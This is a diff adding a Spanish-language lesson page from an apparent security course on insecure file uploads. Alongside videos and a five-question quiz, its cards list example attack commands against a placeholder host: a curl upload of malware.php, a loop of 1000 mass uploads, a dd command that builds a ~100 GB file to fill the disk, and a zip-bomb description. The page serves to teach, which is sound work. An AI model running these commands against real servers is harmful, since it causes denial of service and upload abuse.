+         </div> <h4><i class="fas fa-file-code"></i> Video explicativo</h4>
+                <div class="video-frame">
+              <iframe width="560" height="315" src="https://www.youtube.com/embed/Yr4xprHkUgw?si=ecCa1GNZTqs5zfI-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-user-lock"></i> 🟡 SIN AUTENTICACIÓN</div>
+            <p>La falta de autenticación permite que <strong>cualquier persona</strong> suba archivos al sistema sin restricciones.</p>
+            <p><strong>Consecuencias:</strong> anonimato del atacante, abuso de recursos, carga masiva y contenido inapropiado.</p>
+
+            <p><strong>Ejemplo de ataque (sin autenticación)</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;"># Subir archivo sin autenticación
+curl -F "file=@malware.php" http://victima.com/upload
+
+# Subir archivos masivamente
+for i in {1..1000}; do
+  curl -F "file=@/dev/zero?size=1000000000" http://victima.com/upload &amp;
+done
+
+# Subir contenido ofensivo
+curl -F "file=@contenido_ofensivo.html" http://victima.com/upload</pre>
+            </div>
+             </div> <h4><i class="fas fa-file-code"></i> Video explicativo</h4>
+                <div class="video-frame">
+             <iframe width="560" height="315" src="https://www.youtube.com/embed/9s16JLoJwlI?si=sFTdVPPRpOfO-Sb9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-weight-hanging"></i> 🟡 SIN LÍMITE DE TAMAÑO</div>
+            <p>No restringir el tamaño de los archivos puede llevar a una <strong>Denegación de Servicio (DoS)</strong> por llenado de disco o consumo excesivo de recursos.</p>
+
+            <p><strong>Ejemplo de ataque</strong></p>
+            <div class="code-block">
+                <pre style="margin:0;"># Crear archivo grande y subirlo
+dd if=/dev/zero of=archivo_gigante bs=1M count=100000
+curl -F "file=@archivo_gigante" http://victima.com/upload
+
+# Zip bomb (ejemplo conceptual): 42.zip
+# Capa 1: 42 KB → 42 MB
+# Capa 2: 42 MB → 42 GB
+# Capa 3: 42 GB → 42 TB
+# Si el servidor intenta descomprimirlo, consume toda la memoria y CPU causando DoS</pre>
+            </div> <h4><i class="fas fa-file-code"></i> Video explicativo</h4>
+                <div class="video-frame">
+            <iframe width="560" height="315" src="https://www.youtube.com/embed/_w-ktFZX9II?si=R69k8oGsqGx3sba2" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        </div>
+
+       
+
+        <!-- ===== QUIZ ===== -->
+        <div class="quiz-container" id="quizContainer">
+            <div id="quizContent"></div>
+            <div class="quiz-nav">
+                <span class="question-counter" id="questionCounter">Pregunta 1 de 5</span>
+                <div>
+                    <button class="btn btn-primary" id="nextBtn" style="display:none;"><i class="fas fa-arrow-right"></i> Siguiente</button>
+                    <button class="btn btn-success" id="finishBtn" style="display:none;"><i class="fas fa-flag-checkered"></i> Terminar nivel</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== RESULTADOS ===== -->
+        <div id="resultsContainer" class="hidden">
+            <div class="results-container">
+                <h2 style="margin-bottom:0.5rem;">📊 Resultado del Nivel 2</h2>
+                <div class="score" id="levelScore">0</div>
+                <div class="score-label">Puntuación (sobre 10)</div>
+                <div id="resultMessage" style="margin-top:0.5rem;font-size:1.1rem;"></div>
+                <div style="margin-top:1rem;display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
+                    <button class="btn btn-primary" onclick="location.reload()"><i class="fas fa-redo"></i> Reintentar</button>
+                    <a href="nivel3.html" class="btn btn-success" id="nextLevelBtn" style="display:none;"><i class="fas fa-arrow-right"></i> Siguiente nivel</a>
+                    <a href="index.html" class="btn btn-outline"><i class="fas fa-home"></i> Volver al índice</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== FOOTER ===== -->
+        <footer style="text-align:center;padding-top:2.5rem;margin-top:2.5rem;border-top:2px solid #e5e5e5;color:#999;font-size:0.8rem;">
+            <p><i class="fas fa-shield-halved"></i> &nbsp; El Vigilante del Código &bull; Nivel 2</p>
+        </footer>
+
+    </div>
+
+    <script>
+        // ================================================================
+        // DATOS DE PREGUNTAS - Nivel 2
+        // ================================================================
+        const QUESTIONS = [{
+            question: '¿Qué es Path Traversal?',
+            options: [
+                'Una técnica para optimizar rutas de archivos',
+                'Un ataque que usa ../ para acceder a archivos fuera de la carpeta permitida',
+                'Un método para comprimir archivos',
+                'Una forma de autenticación segura'
+            ],
+            correct: [1]
+        }, {
+            question: '¿Qué permite la vulnerabilidad de "carga de archivos insegura"?',
+            options: [
+                'Subir solo archivos de imagen',
+                'Ejecutar código malicioso en el servidor',
+                'Mejorar la velocidad de carga',
+                'Comprimir archivos automáticamente'
+            ],
+            correct: [1]
+        }, {
+            question: '¿Cuál es el riesgo de no tener autenticación en la subida de archivos?',
+            options: [
+                'Los archivos se suben más rápido',
+                'Cualquier persona puede subir archivos maliciosos',
+                'Los archivos se guardan con mejor calidad',
+                'El servidor usa menos recursos'
+            ],
+            correct: [1]
+        }, {
+            question: '¿Qué problema causa no tener límite de tamaño de archivo?',
+            options: [
+                'Los archivos se suben más lentos',
+                'El servidor puede quedarse sin espacio en disco',
+                'Los archivos se comprimen automáticamente',
+                'La calidad de los archivos mejora'
+            ],
+            correct: [1]
+        }, {
+            question: '¿Qué vulnerabilidad permite leer archivos del sistema como /etc/passwd?',
+            options: [
+                'Carga de archivos insegura',
+                'Path Traversal',
+                'Falta de autenticación',
+                'Sin límite de tamaño'
+            ],
+            correct: [1]
+        }];
+
+        // ================================================================
+        // NOMBRES DE NIVELES PARA NAVEGACIÓN
+        // ================================================================
+        const LEVEL_NAMES = [
+            '1. ¿Qué sucedió?',
+            '2. Vulnerabilidad',
+            '3. ¿Cómo evitarlo?',
+            '4. Pruebas',
+            '5. Herramientas',
+            '6. Incidentes',
+            '7. Responder',
+            '8. Lección',
+            '9. Crucigrama',
+            '10. Reflexión'
+        ];
+
+        const LEVEL_FILES = [
+            'nivel1.html',
+            'nivel2.html',
+            'nivel3.html',
+            'nivel4.html',
+            'nivel5.html',
+            'nivel6.html',
+            'nivel7.html',
+            'nivel8.html',
+            'nivel9.html',
+            'nivel10.html'
+        ];
+
+        // ================================================================
+        // ESTADO DEL NIVEL
+        // ================================================================
+        const state = {
+            currentQuestion: 0,
+            answers: [],
+            results: [],
+            finished: false,
+            score: 0,
+            approved: false
+        };
+
+        // ================================================================
+        // UTILIDADES
+        // ================================================================
+        function shuffleArray(arr) {
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+
+        function showToast(msg, type = '') {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = 'toast show' + (type ? ' ' + type : '');
+            clearTimeout(t._timer);
+            t._timer = setTimeout(() => { t.classList.remove('show'); }, 3000);
+        }
+
+        // ================================================================
+        // RENDERIZAR NAVEGACIÓN
+        // ================================================================
+        function renderNav() {
+            const nav = document.getElementById('levelNav');
+            if (!nav) return;
+            nav.innerHTML = '';
+
+            for (let i = 0; i < LEVEL_NAMES.length; i++) {
+                const a = document.createElement('a');
+                a.href = LEVEL_FILES[i];
+                a.innerHTML = `
+                    <i class="fas ${i === 1 ? 'fa-circle' : 'fa-circle'}"></i>
+                    <span>${LEVEL_NAMES[i].replace(/^\d+\.\s/, '')}</span>
+                    <span class="badge-nav">${i + 1}</span>
+                `;
+                if (i === 1) a.classList.add('active');
+                nav.appendChild(a);
+            }
+        }
+
+        // ================================================================
+        // RENDERIZAR PREGUNTA
+        // ================================================================
+        function renderQuestion() {
+            const qIndex = state.currentQuestion;
+            const totalQ = QUESTIONS.length;
+
+            if (qIndex >= totalQ) return;
+
+            const q = QUESTIONS[qIndex];
+            const container = document.getElementById('quizContent');
+            const counter = document.getElementById('questionCounter');
+            const nextBtn = document.getElementById('nextBtn');
+            const finishBtn = document.getElementById('finishBtn');
+
+            if (!container) return;
+
+            const shuffledOptions = shuffleArray([...q.options]);
+            const correctIndices = q.correct.map(idx => shuffledOptions.indexOf(q.options[idx]));
+
+            let html = `
+                <div class="quiz-question">${q.question}</div>
+                <div class="quiz-options" id="quizOptions">
+            `;
+
+            const labels = ['A', 'B', 'C', 'D'];
+            shuffledOptions.forEach((opt, idx) => {
+                html += `
+                    <div class="quiz-option" data-opt="${idx}" data-correct="${correctIndices.includes(idx)}">
+                        <span class="opt-label">${labels[idx]}.</span>
+                        ${opt}
+                    </div>
+                `;
+            });
+
+            html += `</div>`;
+            html += `<div class="quiz-feedback" id="quizFeedback"></div>`;
+
+            container.innerHTML = html;
+
+            counter.textContent = `Pregunta ${qIndex + 1} de ${totalQ}`;
+
+            nextBtn.style.display = 'none';
+            finishBtn.style.display = 'none';
+
+            const options = container.querySelectorAll('.quiz-option');
+            const isMulti = q.correct.length > 1;
+
+            options.forEach(opt => {
+                opt.addEventListener('click', function() {
+                    if (this.classList.contains('disabled')) return;
+                    const optIndex = parseInt(this.dataset.opt);
+
+                    if (isMulti) {
+                        this.classList.toggle('selected');
+                    } else {
+                        options.forEach(o => o.classList.remove('selected'));
+                        this.classList.add('selected');
+                    }
+
+                    const selected = [];
+                    options.forEach(o => {
+                        if (o.classList.contains('selected')) {
+                            selected.push(parseInt(o.dataset.opt));
+                        }
+                    });
+                    state.answers[qIndex] = selected;
+
+                    checkAnswer();
+                });
+            });
+
+            if (state.answers[qIndex]) {
+                const saved = state.answers[qIndex];
+                options.forEach(opt => {
+                    const idx = parseInt(opt.dataset.opt);
+                    if (saved.includes(idx)) {
+                        opt.classList.add('selected');
+                    }
+                });
+                checkAnswer();
+            }
+        }
+
+        // ================================================================
+        // VERIFICAR RESPUESTA
+        // ================================================================
+        function checkAnswer() {
+            const qIndex = state.currentQuestion;
+            const q = QUESTIONS[qIndex];
+            const container = document.getElementById('quizContent');
+            const nextBtn = document.getElementById('nextBtn');
+            const finishBtn = document.getElementById('finishBtn');
+
+            if (!container) return;
+
+            const options = container.querySelectorAll('.quiz-option');
+            const selected = state.answers[qIndex] || [];
+
+            if (selected.length === 0) {
+                nextBtn.style.display = 'none';
+                finishBtn.style.display = 'none';
+                return;
+            }
+
+            options.forEach(o => o.classList.add('disabled'));
+
+            const correctIndices = [];
+            options.forEach(o => {
+                if (o.dataset.correct === 'true') {
+                    correctIndices.push(parseInt(o.dataset.opt));
+                }
+            });
+
+            let selectedCorrect = 0;
+            let selectedWrong = 0;
+
+            options.forEach(o => {
+                const idx = parseInt(o.dataset.opt);
+                const isCorrect = o.dataset.correct === 'true';
+                const isSelected = selected.includes(idx);
+
+                if (isSelected && isCorrect) {
+                    o.classList.add('correct');
+                    selectedCorrect++;
+                } else if (isSelected && !isCorrect) {
+                    o.classList.add('wrong');
+                    selectedWrong++;
+                } else if (!isSelected && isCorrect) {
+                    o.classList.add('correct');
+                }
+            });
+
+            let score = 0;
+            const totalCorrect = correctIndices.length;
+            if (selectedCorrect === totalCorrect && selectedWrong === 0) {
+                score = 2;
+            } else if (selectedCorrect > 0 || totalCorrect > 0) {
+                const net = selectedCorrect - selectedWrong;
+                score = Math.max(0, (net / totalCorrect) * 2);
+                score = Math.round(score * 10) / 10;
+            }
+
+            const result = {
+                correct: score === 2,
+                score: score,
+                selected: selected,
+                correctIndices: correctIndices,
+                totalCorrect: totalCorrect
+            };
+            state.results[qIndex] = result;
+
+            const feedback = document.getElementById('quizFeedback');
+            if (score === 2) {
+                feedback.className = 'quiz-feedback success';
+                feedback.textContent = '✅ ¡Correcto! Respuesta perfecta.';
+            } else if (score > 0) {
+                feedback.className = 'quiz-feedback partial';
+                feedback.textContent = `⚠️ Parcialmente correcto. Puntuación: ${score.toFixed(1)}/2.`;
+            } else {
+                feedback.className = 'quiz-feedback error';
+                feedback.textContent = '❌ Incorrecto. Revisa el contenido del nivel.';
+            }
+
+            const totalQ = QUESTIONS.length;
+            if (qIndex === totalQ - 1) {
+                finishBtn.style.display = 'inline-block';
+                finishBtn.onclick = function() {
+                    finishLevel();
+                };
+            } else {
+                nextBtn.style.display = 'inline-block';
+                nextBtn.onclick = function() {
+                    state.currentQuestion++;
+                    renderQuestion();
+                };
+            }
+        }
+
+        // ================================================================
+        // FINALIZAR NIVEL
+        // ================================================================
+        function finishLevel() {
+            const totalQ = QUESTIONS.length;
+
+            for (let i = 0; i < totalQ; i++) {
+                if (!state.results[i]) {
+                    showToast('❌ Responde todas las preguntas antes de terminar', 'error');
+                    return;
+                }
+            }
+
+            let levelScore = 0;
+            state.results.forEach(r => {
+                levelScore += r.score;
+            });
+            state.score = levelScore;
+            state.finished = true;
+            state.approved = levelScore >= 7;
+
+            document.getElementById('quizContainer').style.display = 'none';
+            document.getElementById('resultsContainer').classList.remove('hidden');
+
+            document.getElementById('levelScore').textContent = levelScore.toFixed(1);
+
+            const msg = document.getElementById('resultMessage');
+            if (state.approved) {
+                msg.innerHTML = '✅ ¡Aprobado! Excelente trabajo.';
+                msg.style.color = '#16a34a';
+                document.getElementById('nextLevelBtn').style.display = 'inline-block';
+            } else {
+                msg.innerHTML = '❌ No aprobado. Necesitas 7/10 para avanzar.';
+                msg.style.color = '#dc2626';
+                document.getElementById('nextLevelBtn').style.display = 'none';
+            }
+        }
+
+        // ================================================================
+        // INICIALIZACIÓN
+        // ================================================================
+        function init() {
+            renderNav();
+            renderQuestion();
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
